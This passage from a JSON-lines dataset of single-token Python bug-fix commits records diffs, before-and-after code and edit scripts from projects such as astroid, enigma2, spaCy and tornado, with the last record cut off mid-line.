{"project": "astroid", "commit_sha": "c7d1bb49f8268e6781289396bbb39def4c0a3134", "parent_sha": "09f7c5223fc3dfb0f81e311bdf675c67649b63c2", "file_path": "test/unittest_manager.py", "project_url": "https://github.com/PCManticore/astroid", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -68,7 +68,7 @@ class ASTNGManagerTC(unittest.TestCase):\n         self._test_astng_from_zip('MyPyPa-0.1.0-py2.5.zip')            \n         \n     def test_from_directory(self):\n-        obj = self.manager.from_directory('data')\n+        obj = self.manager.from_directory(DATA)\n         self.assertEqual(obj.name, 'data')\n         self.assertEqual(obj.path, DATA)\n         \n", "before": "obj = self . manager . from_directory ( 'data' )", "after": "obj = self . manager . from_directory ( DATA )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 42, 3, 50], [\"identifier:DATA\", \"T\"], 1], [\"Delete\", [\"string:'data'\", 3, 43, 3, 49]]]"}
{"project": "astroid", "commit_sha": "9b180e60607bee8c3269a0f1a910d041ecec7353", "parent_sha": "3fd77022e4c41f94ea3375792d9b513075e13402", "file_path": "builder.py", "project_url": "https://github.com/PCManticore/astroid", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -136,7 +136,7 @@ class ASTNGBuilder:\n         \"\"\"build astng from a source code stream (i.e. from an ast)\"\"\"\n         return self.ast_build(parse(data + '\\n'), modname, path)\n        \n-    def ast_build(self, node, modname=None, path=None):\n+    def ast_build(self, node, modname='', path=None):\n         \"\"\"recurse on the ast (soon ng) to add some arguments et method\"\"\"\n         print '*'*80\n         print modname, path\n", "before": "def ast_build ( self , node , modname = None , path = None ) : \"\"\"recurse on the ast (soon ng) to add some arguments et method\"\"\" print '*' * 80 print modname , path", "after": "def ast_build ( self , node , modname = '' , path = None ) : \"\"\"recurse on the ast (soon ng) to add some arguments et method\"\"\" print '*' * 80 print modname , path", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 31, 3, 43], [\"string:''\", \"T\"], 2], [\"Delete\", [\"none:None\", 3, 39, 3, 43]]]"}
{"project": "wxfixboot", "commit_sha": "e86f84200919f31d7b362fc60742158caec1999e", "parent_sha": "eb8de7f64fabb0350e3c65fa3d9ddc5d0f64aff6", "file_path": "Tools/StartupTools/core.py", "project_url": "https://github.com/hamishmb/wxfixboot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -245,7 +245,7 @@ class Main():\n         else:\n             logger.debug(\"CoreStartupTools: Main().LookForBootloadersOnPartition(): Looking for bootloaders in / (Current OS)...\")\n \n-        Bootloader = None\n+        Bootloader = \"Unknown\"\n         AvailableBootloaders = []\n \n         #Okay, let's run a command in the chroot that was set up in self.FindBootloaderRemovalOSs(), depending on which package manager this OS uses, and which bootloader is currently installed.\n", "before": "Bootloader = None", "after": "Bootloader = \"Unknown\"", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 26], [\"string:\\\"Unknown\\\"\", \"T\"], 2], [\"Delete\", [\"none:None\", 3, 22, 3, 26]]]"}
{"project": "enigma2", "commit_sha": "42e75e46362bade5905959edd42a187d568d9a45", "parent_sha": "6fef56891e275d62f056a4469156c0da217dc6b8", "file_path": "lib/python/Components/UsageConfig.py", "project_url": "https://github.com/nx111/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -62,7 +62,7 @@ def InitUsageConfig():\n \tconfig.usage.show_infobar_on_zap = ConfigYesNo(default = True)\n \tconfig.usage.show_infobar_on_skip = ConfigYesNo(default = True)\n \tconfig.usage.show_infobar_on_event_change = ConfigYesNo(default = False)\n-\tconfig.usage.show_second_infobar = ConfigSelection(default = \"0\", choices = [(None, _(\"None\"))] + choicelist + [(\"EPG\",_(\"EPG\"))])\n+\tconfig.usage.show_second_infobar = ConfigSelection(default = \"0\", choices = [(\"\", _(\"None\"))] + choicelist + [(\"EPG\",_(\"EPG\"))])\n \tconfig.usage.show_simple_second_infobar = ConfigYesNo(default = False)\n \tconfig.usage.infobar_frontend_source = ConfigSelection(default = \"settings\", choices = [(\"settings\", _(\"Settings\")), (\"tuner\", _(\"Tuner\"))])\n \tconfig.usage.oldstyle_zap_controls = ConfigYesNo(default = False)\n", "before": "config . usage . show_second_infobar = ConfigSelection ( default = \"0\" , choices = [ ( None , _ ( \"None\" ) ) ] + choicelist + [ ( \"EPG\" , _ ( \"EPG\" ) ) ] )", "after": "config . usage . show_second_infobar = ConfigSelection ( default = \"0\" , choices = [ ( \"\" , _ ( \"None\" ) ) ] + choicelist + [ ( \"EPG\" , _ ( \"EPG\" ) ) ] )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"tuple\", 3, 79, 3, 96], [\"string:\\\"\\\"\", \"T\"], 1], [\"Delete\", [\"none:None\", 3, 80, 3, 84]]]"}
{"project": "enigma2", "commit_sha": "14d2841c95105573bc59e87657eb8fb8e2bcb7ef", "parent_sha": "43daa4a4977458503f80900194fe0779995a1257", "file_path": "lib/python/Components/Task.py", "project_url": "https://github.com/nx111/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -303,13 +303,13 @@ class WorkspaceExistsPrecondition(Condition):\n class DiskspacePrecondition(Condition):\n \tdef __init__(self, diskspace_required):\n \t\tself.diskspace_required = diskspace_required\n-\t\tself.diskspace_available = None\n+\t\tself.diskspace_available = 0\n \n \tdef check(self, task):\n \t\timport os\n \t\ttry:\n \t\t\ts = os.statvfs(task.job.workspace)\n-\t\t\tself.diskspace_available = s.f_bsize * s.f_bavail \n+\t\t\tself.diskspace_available = s.f_bsize * s.f_bavail\n \t\t\treturn self.diskspace_available >= self.diskspace_required\n \t\texcept OSError:\n \t\t\treturn False\n", "before": "self . diskspace_available = None", "after": "self . diskspace_available = 0", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"assignment\", 3, 3, 3, 34], [\"integer:0\", \"T\"], 2], [\"Delete\", [\"none:None\", 3, 30, 3, 34]]]"}
{"project": "enigma2", "commit_sha": "6c2dd9e594f2dc076011609dc54483d103d90564", "parent_sha": "a072f55b74af5b939e6c08b6fcef2d2d5473b0d6", "file_path": "Navigation.py", "project_url": "https://github.com/nx111/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -35,7 +35,7 @@ class Navigation:\n \t\t\t\tprint \"buggy fp driver detected!!! please update drivers.... ignore timer wakeup!\"\n \t\t\telif len(self.getRecordings()) or abs(self.RecordTimer.getNextRecordingTime() - time()) <= 360:\n \t\t\t\tif not Screens.Standby.inTryQuitMainloop: # not a shutdown messagebox is open\n-\t\t\t\t\tRecordTimer.RecordTimerEntry.TryQuitMainloop(0) # start shutdown handling\n+\t\t\t\t\tRecordTimer.RecordTimerEntry.TryQuitMainloop(False) # start shutdown handling\n \t\tself.SleepTimer = SleepTimer.SleepTimer()\n \n \tdef dispatchEvent(self, i):\n", "before": "RecordTimer . RecordTimerEntry . TryQuitMainloop ( 0 )", "after": "RecordTimer . RecordTimerEntry . TryQuitMainloop ( False )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 50, 3, 53], [\"false:False\", \"T\"], 1], [\"Delete\", [\"integer:0\", 3, 51, 3, 52]]]"}
{"project": "enigma2", "commit_sha": "e06775bd7fd937db1148ecea6e162ad76821700e", "parent_sha": "4f1fab7b13be9d8d3fb013c14378264968502b2a", "file_path": "lib/python/Components/config.py", "project_url": "https://github.com/nx111/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -764,7 +764,7 @@ class ConfigText(ConfigElement, NumericalTextInput):\n \n class ConfigPassword(ConfigText):\n \tdef __init__(self, default = \"\", fixed_size = False, visible_width = False, censor = \"*\"):\n-\t\tConfigText.__init__(self, default = \"\", fixed_size = fixed_size, visible_width = visible_width)\n+\t\tConfigText.__init__(self, default = default, fixed_size = fixed_size, visible_width = visible_width)\n \t\tself.censor_char = censor\n \t\tself.hidden = True\n \n", "before": "ConfigText . __init__ ( self , default = \"\" , fixed_size = fixed_size , visible_width = visible_width )", "after": "ConfigText . __init__ ( self , default = default , fixed_size = fixed_size , visible_width = visible_width )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 29, 3, 41], [\"identifier:default\", \"T\"], 2], [\"Delete\", [\"string:\\\"\\\"\", 3, 39, 3, 41]]]"}
{"project": "enigma2", "commit_sha": "7f589b657d12176bdf16ed6720964681dcc27b4a", "parent_sha": "102039a66da3684b4983bef947c36c98013b2d85", "file_path": "lib/python/Components/TimerSanityCheck.py", "project_url": "https://github.com/nx111/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -156,7 +156,7 @@ class TimerSanityCheck:\n \t\tidx = 0\n \t\toverlaplist = []\n \t\tfor event in self.nrep_eventlist:\n-\t\t\tcnt -= event[1]\n+\t\t\tcnt += event[1]\n \t\t\tif event[2] == -1: # new timer\n \t\t\t\ttimer = self.newtimer\n \t\t\telse:\n", "before": "cnt -= event [ 1 ]", "after": "cnt += event [ 1 ]", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"augmented_assignment\", 3, 4, 3, 19], [\"+=:+=\", \"T\"], 1], [\"Delete\", [\"-=:-=\", 3, 8, 3, 10]]]"}
{"project": "oq-hazardlib", "commit_sha": "98b2ffb5e84e5f65714c99dd637d358eedec5c13", "parent_sha": "5e7f70a725bc001858d7004ce3254bfe979ef4a0", "file_path": "tests/geo/surface/simple_fault_test.py", "project_url": "https://github.com/treviallen/oq-hazardlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -47,7 +47,7 @@ class SimpleFaultSurfaceCheckFaultDataTestCase(utils.SurfaceTestCase):\n \n     def test_upper_seismo_depth_range(self):\n         self.assertRaises(ValueError, SimpleFaultSurface.check_fault_data,\n-                          self.fault_trace, -0.1, None, 90.0, 1.0)\n+                          self.fault_trace, -0.1, 10.0, 90.0, 1.0)\n \n         SimpleFaultSurface.check_fault_data(self.fault_trace,\n                                             0.0, 1.0, 90.0, 1.0)\n", "before": "self . assertRaises ( ValueError , SimpleFaultSurface . check_fault_data , self . fault_trace , - 0.1 , None , 90.0 , 1.0 )", "after": "self . assertRaises ( ValueError , SimpleFaultSurface . check_fault_data , self . fault_trace , - 0.1 , 10.0 , 90.0 , 1.0 )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 2, 26, 3, 67], [\"float:10.0\", \"T\"], 9], [\"Delete\", [\"none:None\", 3, 51, 3, 55]]]"}
{"project": "oq-hazardlib", "commit_sha": "3d0995d5c59db56817692497ceb182fe3cc3ad99", "parent_sha": "d6f66d95069381110b962a39aa2142202d5aec29", "file_path": "openquake/hazardlib/source/base.py", "project_url": "https://github.com/treviallen/oq-hazardlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -45,7 +45,7 @@ class BaseSeismicSource(object):\n         self.name = name\n         self.tectonic_region_type = tectonic_region_type\n         self.trt_model_id = None  # set by the engine\n-        self.weight = None  # set by the engine\n+        self.weight = 1  # set by the engine\n         self.seed = None  # set by the engine\n \n     @abc.abstractmethod\n", "before": "self . weight = None", "after": "self . weight = 1", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 27], [\"integer:1\", \"T\"], 2], [\"Delete\", [\"none:None\", 3, 23, 3, 27]]]"}
{"project": "eng-ops", "commit_sha": "7e9a9d6f4a40156378c6f442e4d6a4044d5a27e4", "parent_sha": "9da2a07bd03998370ad663699b696a342e6e0af9", "file_path": "api/views.py", "project_url": "https://github.com/FundersClub/eng-ops", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -26,7 +26,7 @@ HANDLER_DICT = {\n def github_callback(request):\n     github_request = GithubRequest.objects.create(\n         body=request.body,\n-        event=request.META.get('HTTP_X_GITHUB_EVENT', None),\n+        event=request.META.get('HTTP_X_GITHUB_EVENT', 'unknown'),\n         method=request.method,\n         time=datetime.now(),\n     )\n", "before": "github_request = GithubRequest . objects . create ( body = request . body , event = request . META . get ( 'HTTP_X_GITHUB_EVENT' , None ) , method = request . method , time = datetime . now ( ) , )", "after": "github_request = GithubRequest . objects . create ( body = request . body , event = request . META . get ( 'HTTP_X_GITHUB_EVENT' , 'unknown' ) , method = request . method , time = datetime . now ( ) , )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 31, 3, 60], [\"string:'unknown'\", \"T\"], 3], [\"Delete\", [\"none:None\", 3, 55, 3, 59]]]"}
{"project": "ebb", "commit_sha": "0496920e1cd9dca7c9285522c61d17c674fe5cc3", "parent_sha": "4faad3e1e7dff48eb63f5d6ecb3b86b390aa0e4c", "file_path": "ebb.py", "project_url": "https://github.com/dontnod/ebb", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -569,7 +569,7 @@ class Slave(Scope):\n     @staticmethod\n     def config(password=None,\n                max_builds=None,\n-               keepalive_interval=None,\n+               keepalive_interval=300,\n                missing_timeout=None):\n         ''' Sets some buildbot slaves settings for current scope '''\n         Scope.set_checked('slave_password', password, basestring)\n", "before": "def config ( password = None , max_builds = None , keepalive_interval = None , missing_timeout = None ) : ''' Sets some buildbot slaves settings for current scope ''' Scope . set_checked ( 'slave_password' , password , basestring )", "after": "def config ( password = None , max_builds = None , keepalive_interval = 300 , missing_timeout = None ) : ''' Sets some buildbot slaves settings for current scope ''' Scope . set_checked ( 'slave_password' , password , basestring )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 16, 3, 39], [\"integer:300\", \"T\"], 2], [\"Delete\", [\"none:None\", 3, 35, 3, 39]]]"}
{"project": "ebb", "commit_sha": "d914fe2702cc6ae826db39b492d7ba3b606ff977", "parent_sha": "b068f637d7ce3d08cc90fa1407a837a2c64b2c9e", "file_path": "ebb.py", "project_url": "https://github.com/dontnod/ebb", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -994,7 +994,7 @@ class GitRepository(Repository):\n                use_time_stamps=None,\n                encoding=None,\n                branch=None,\n-               submodules=None,\n+               submodules=True,\n                shallow=None,\n                progress=None,\n                retry_fetch=None,\n", "before": "submodules = None ,", "after": "submodules = True ,", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"expression_list\", 3, 27, 3, 32], [\"true:True\", \"T\"], 0], [\"Delete\", [\"none:None\", 3, 27, 3, 31]]]"}
{"project": "enigma2", "commit_sha": "05e172a0522c77f55fe64e54411973f65a1deb93", "parent_sha": "2334840aabb952e3b6ee5cc60c368f7f2884d9dd", "file_path": "lib/python/Components/LanguageList.py", "project_url": "https://github.com/nx111/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -17,7 +17,7 @@ RT_VALIGN_CENTER = 8\n RT_VALIGN_BOTTOM = 16\n \n def LanguageEntryComponent(file, name):\n-\tres = [ None ]\n+\tres = [ 0 ]\n \tres.append((eListboxPythonMultiContent.TYPE_TEXT, 80, 10, 200, 50, 0, RT_HALIGN_LEFT ,name))\n \tpng = loadPNG(resolveFilename(SCOPE_SKIN_IMAGE, \"/countries/\" + file + \".png\"))\n \tif png == None:\n", "before": "res = [ None ]", "after": "res = [ 0 ]", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"list\", 3, 8, 3, 16], [\"integer:0\", \"T\"], 1], [\"Delete\", [\"none:None\", 3, 10, 3, 14]]]"}
{"project": "speechless", "commit_sha": "5ca5fb1c2964e4ebf7f8a84ba390623ff6f8a9e1", "parent_sha": "ec2ab96d1053817cd75c284e0082ffc5fc834bb9", "file_path": "net.py", "project_url": "https://github.com/JuliusKunze/speechless", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -30,7 +30,7 @@ class Wav2Letter:\n                  allowed_characters: List[chr] = list(string.ascii_uppercase + \" '\"),\n                  use_raw_wave_input: bool = False,\n                  activation: str = \"relu\",\n-                 output_activation: str = None,\n+                 output_activation: str = \"softmax\",\n                  optimizer: Optimizer = SGD(lr=1e-3, momentum=0.9, clipnorm=5)):\n \n         self.output_activation = output_activation\n", "before": "output_activation : str = None ,", "after": "output_activation : str = \"softmax\" ,", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"expression_list\", 3, 43, 3, 48], [\"string:\\\"softmax\\\"\", \"T\"], 0], [\"Delete\", [\"none:None\", 3, 43, 3, 47]]]"}
{"project": "installapplications", "commit_sha": "8fbf44c964e43fe1b42feeacefda406760889bcd", "parent_sha": "554c9d13d3167cfeba88a2b0cd14a53d96bf6a71", "file_path": "payload/Library/Application Support/installapplications/installapplications.py", "project_url": "https://github.com/erikng/installapplications", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -344,7 +344,7 @@ def main():\n     o.add_option('--laidentifier',\n                  default='com.erikng.installapplications',\n                  help=('Optional: Specify LaunchAgent identifier.'))\n-    o.add_option('--reboot', default=None,\n+    o.add_option('--reboot', default=False,\n                  help=('Optional: Trigger a reboot.'), action='store_true')\n     o.add_option('--dry-run', help=('Optional: Dry run (for testing).'),\n                  action='store_true')\n", "before": "o . add_option ( '--reboot' , default = None , help = ( 'Optional: Trigger a reboot.' ) , action = 'store_true' )", "after": "o . add_option ( '--reboot' , default = False , help = ( 'Optional: Trigger a reboot.' ) , action = 'store_true' )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 30, 3, 42], [\"false:False\", \"T\"], 2], [\"Delete\", [\"none:None\", 3, 38, 3, 42]]]"}
{"project": "oq-hazardlib", "commit_sha": "552b812ab4ba52e72f2325458b5a8d213b884e79", "parent_sha": "6dfc236f9a4e40da5fe7702398cb3d6b592933d1", "file_path": "nhe/mfd/truncated_gr.py", "project_url": "https://github.com/treviallen/oq-hazardlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,7 +73,7 @@ class TruncatedGR(BaseMFD):\n         return (10 ** (self.a_val - self.b_val * mag_lo)\n                 - 10 ** (self.a_val - self.b_val * mag_hi))\n \n-    def get_annual_occurence_rates(self):\n+    def get_annual_occurrence_rates(self):\n", "before": "def get_annual_occurence_rates ( self ) : ", "after": "def get_annual_occurrence_rates ( self ) : ", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:get_annual_occurence_rates\", 3, 9, 3, 35], \"get_annual_occurrence_rates\"]]"}
{"project": "exoplanet", "commit_sha": "9831c5d7b94db47ab22f9e2b0f9fa9d1b9fb4955", "parent_sha": "c1eb56d3b135878e2e14613bb291b8cf520a08d1", "file_path": "exoplanet/transforms.py", "project_url": "https://github.com/dfm/exoplanet", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -79,7 +79,7 @@ class AngleTransform(tr.Transform):\n     name = \"angle\"\n \n     def __init__(self, *args, **kwargs):\n-        self.regularized = kwargs.pop(\"regularized\", 10.0)\n+        self.regularized = kwargs.pop(\"regularized\", None)\n         super(AngleTransform, self).__init__(*args, **kwargs)\n \n     def backward(self, y):\n", "before": "self . regularized = kwargs . pop ( \"regularized\" , 10.0 )", "after": "self . regularized = kwargs . pop ( \"regularized\" , None )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 38, 3, 59], [\"none:None\", \"T\"], 3], [\"Delete\", [\"float:10.0\", 3, 54, 3, 58]]]"}
{"project": "mercury", "commit_sha": "ee0564f969ca1b11e865fc8743dc8e12eeb3fb3f", "parent_sha": "2be067d703027aa0f7690d9178ceff7e6f1d2a17", "file_path": "fab/initialization.py", "project_url": "https://github.com/pantheon-deprecated/mercury", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -127,7 +127,7 @@ def _initialize_drush():\n     local('drush dl drush_make')\n \n \n-def initialize_solr(server=pantheon.PantheonServer()):\n+def _initialize_solr(server=pantheon.PantheonServer()):\n     temp_dir = tempfile.mkdtemp()\n     with cd(temp_dir):\n         local('wget http://apache.osuosl.org/lucene/solr/1.4.1/apache-solr-1.4.1.tgz')\n", "before": "def initialize_solr ( server = pantheon . PantheonServer ( ) ) : temp_dir = tempfile . mkdtemp ( ) with cd ( temp_dir ) : local ( 'wget http://apache.osuosl.org/lucene/solr/1.4.1/apache-solr-1.4.1.tgz' )", "after": "def _initialize_solr ( server = pantheon . PantheonServer ( ) ) : temp_dir = tempfile . mkdtemp ( ) with cd ( temp_dir ) : local ( 'wget http://apache.osuosl.org/lucene/solr/1.4.1/apache-solr-1.4.1.tgz' )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:initialize_solr\", 3, 5, 3, 20], \"_initialize_solr\"]]"}
{"project": "radical.saga", "commit_sha": "e15647145e4a15990397b896cb7330f3492406d7", "parent_sha": "bde996fcad7f1f7f9028b2e282a29bdc832f7b1f", "file_path": "saga/adaptors/ssh/ssh_job.py", "project_url": "https://github.com/radical-cybertools/radical.saga", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -505,7 +505,7 @@ class SSHJob (saga.adaptors.cpi.job.Job) :\n         self._method_type     = \"run\"\n \n         # initialize job attribute values\n-        self._id              = \"default id\"\n+        self._id              = None\n         self._state           = saga.job.NEW\n         self._exit_code       = None\n         self._exception       = None\n", "before": "self . _id = \"default id\"", "after": "self . _id = None", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 45], [\"none:None\", \"T\"], 2], [\"Delete\", [\"string:\\\"default id\\\"\", 3, 33, 3, 45]]]"}
{"project": "radical.saga", "commit_sha": "b7080d118b05370cf609d339e28a3523296ee3b7", "parent_sha": "2b8bc2993c4d02137298cf755e5b12686b7e630e", "file_path": "saga/task.py", "project_url": "https://github.com/radical-cybertools/radical.saga", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -181,7 +181,7 @@ class Container (saga.attributes.Attributes) :\n \n \n \n-    def size (self) :\n+    def get_size (self) :\n \n         return len(self.tasks)\n \n", "before": "def size ( self ) : return len ( self . tasks )", "after": "def get_size ( self ) : return len ( self . tasks )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:size\", 3, 9, 3, 13], \"get_size\"]]"}
{"project": "radical.saga", "commit_sha": "fe8bad1e811ab8114b9a7e8a0b7d54faf1be1e22", "parent_sha": "720afdf4149ee734188fa40d3d75b934bf8d56e8", "file_path": "saga/namespace/directory.py", "project_url": "https://github.com/radical-cybertools/radical.saga", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -199,7 +199,7 @@ class Directory (entry.Entry) :\n                   rus.optional (int),\n                   rus.optional (rus.one_of (SYNC, ASYNC, TASK)))\n     @rus.returns ((rus.nothing, st.Task))\n-    def change_dir (self, url, flags=None, ttype=None) :\n+    def change_dir (self, url, flags=0, ttype=None) :\n", "before": "def change_dir ( self , url , flags = None , ttype = None ) : ", "after": "def change_dir ( self , url , flags = 0 , ttype = None ) : ", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 32, 3, 42], [\"integer:0\", \"T\"], 2], [\"Delete\", [\"none:None\", 3, 38, 3, 42]]]"}
{"project": "cbapi", "commit_sha": "2b0426cc59f964cc95b147ad2fe098db8bdc1481", "parent_sha": "17bbeb72ee659d50431f5f4491af89c5e5e62018", "file_path": "client_apis/python/src/cbapi/cbapi.py", "project_url": "https://github.com/carbonblack/cbapi", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -304,7 +304,7 @@ class CbApi(object):\n         r.raise_for_status()\n         return r.json()\n \n-    def watchlist_add(self, type, name, search_query, id=id, readonly=False):\n+    def watchlist_add(self, type, name, search_query, id=None, readonly=False):\n         '''\n         adds a new watchlist\n         '''\n", "before": "def watchlist_add ( self , type , name , search_query , id = id , readonly = False ) : '''\n         adds a new watchlist\n         '''", "after": "def watchlist_add ( self , type , name , search_query , id = None , readonly = False ) : '''\n         adds a new watchlist\n         '''", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 55, 3, 60], [\"none:None\", \"T\"], 2], [\"Delete\", [\"identifier:id\", 3, 58, 3, 60]]]"}
{"project": "mollyproject", "commit_sha": "afe7284ff7dc9ec2a13625b776f34daf26480bff", "parent_sha": "1bb9a3e8d4d34c0255785af34ec280fce44ebf90", "file_path": "molly/apps/places/providers/acislive.py", "project_url": "https://github.com/mollyproject/mollyproject", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -339,7 +339,7 @@ class ACISLiveRouteProvider(BaseMapsProvider):\n                     # the fake bus stops Oxontime made up for the TUBE route\n                     try:\n                         entity = Entity.objects.get(source=self._get_source(),\n-                                                    _identifiers__scheme='naptan',\n+                                                    _identifiers__scheme=scheme,\n                                                     _identifiers__value=stop_code)\n                     except Entity.DoesNotExist:\n                         entity = Entity(source=self._get_source())\n", "before": "entity = Entity . objects . get ( source = self . _get_source ( ) , _identifiers__scheme = 'naptan' , _identifiers__value = stop_code )", "after": "entity = Entity . objects . get ( source = self . _get_source ( ) , _identifiers__scheme = scheme , _identifiers__value = stop_code )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 53, 3, 82], [\"identifier:scheme\", \"T\"], 2], [\"Delete\", [\"string:'naptan'\", 3, 74, 3, 82]]]"}
{"project": "tornado", "commit_sha": "adafcc06d850605b2f1b2cf34070518d853768db", "parent_sha": "f63525f7a44d7b5d12c327d1173f2c2680d56757", "file_path": "tornado/web.py", "project_url": "https://github.com/milancermak/tornado", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -875,7 +875,7 @@ class RequestHandler(object):\n                 self.send_error(e.status_code, exception=e)\n         else:\n             logging.error(\"Uncaught exception %s\\n%r\", self._request_summary(),\n-                          self.request, exc_info=e)\n+                          self.request, exc_info=True)\n             self.send_error(500, exception=e)\n \n     def _ui_module(self, name, module):\n", "before": "else : logging . error ( \"Uncaught exception %s\\n%r\" , self . _request_summary ( ) , self . request , exc_info = e )", "after": "else : logging . error ( \"Uncaught exception %s\\n%r\" , self . _request_summary ( ) , self . request , exc_info = True )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 41, 3, 51], [\"true:True\", \"T\"], 2], [\"Delete\", [\"identifier:e\", 3, 50, 3, 51]]]"}
{"project": "spaCy", "commit_sha": "96f0caa28a9c6535b708d6dddc2312b99e350378", "parent_sha": "dc2bb1259f3c31e1744f715e09e3449b61f03c5d", "file_path": "spacy/tests/vocab/test_vocab_api.py", "project_url": "https://github.com/connorbrinton/spaCy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -33,7 +33,7 @@ def test_vocab_api_symbols(en_vocab, string, symbol):\n \n \n @pytest.mark.parametrize('text', \"Hello\")\n-def test_contains(en_vocab, text):\n+def test_vocab_api_contains(en_vocab, text):\n     _ = en_vocab[text]\n     assert text in en_vocab\n     assert \"LKsdjvlsakdvlaksdvlkasjdvljasdlkfvm\" not in en_vocab\n", "before": "def test_contains ( en_vocab , text ) : _ = en_vocab [ text ] assert text in en_vocab assert \"LKsdjvlsakdvlaksdvlkasjdvljasdlkfvm\" not in en_vocab", "after": "def test_vocab_api_contains ( en_vocab , text ) : _ = en_vocab [ text ] assert text in en_vocab assert \"LKsdjvlsakdvlaksdvlkasjdvljasdlkfvm\" not in en_vocab", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:test_contains\", 3, 5, 3, 18], \"test_vocab_api_contains\"]]"}
{"project": "spaCy", "commit_sha": "f83dfe62dadfce31697989d4c078500ae941a244", "parent_sha": "fd09e6b140c1334f6fc110f32dec8d2f93c927b1", "file_path": "spacy/tests/doc/test_morphanalysis.py", "project_url": "https://github.com/connorbrinton/spaCy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -77,7 +77,7 @@ def test_morph_property(tokenizer):\n     assert doc.to_array([\"MORPH\"])[0] != 0\n \n     # unset with token.morph\n-    doc[0].set_morph(0)\n+    doc[0].set_morph(None)\n     assert doc.to_array([\"MORPH\"])[0] == 0\n \n     # empty morph is equivalent to \"_\"\n", "before": "doc [ 0 ] . set_morph ( 0 )", "after": "doc [ 0 ] . set_morph ( None )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 21, 3, 24], [\"none:None\", \"T\"], 1], [\"Delete\", [\"integer:0\", 3, 22, 3, 23]]]"}
{"project": "spaCy", "commit_sha": "b97dbab998640479e8ba0dfbe8fa1759908195df", "parent_sha": "2880d8a5559f60b7461bf290154c8753815b70fa", "file_path": "spacy/tests/tokenizer/test_whitespace.py", "project_url": "https://github.com/connorbrinton/spaCy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -18,7 +18,7 @@ def test_tokenizer_splits_double_space(tokenizer, text):\n \n \n @pytest.mark.parametrize(\"text\", [\"lorem ipsum  \"])\n-def test_tokenizer_handles_double_trainling_ws(tokenizer, text):\n+def test_tokenizer_handles_double_trailing_ws(tokenizer, text):\n     tokens = tokenizer(text)\n     assert repr(tokens.text_with_ws) == repr(text)\n \n", "before": "def test_tokenizer_handles_double_trainling_ws ( tokenizer , text ) : tokens = tokenizer ( text ) assert repr ( tokens . text_with_ws ) == repr ( text )", "after": "def test_tokenizer_handles_double_trailing_ws ( tokenizer , text ) : tokens = tokenizer ( text ) assert repr ( tokens . text_with_ws ) == repr ( text )", 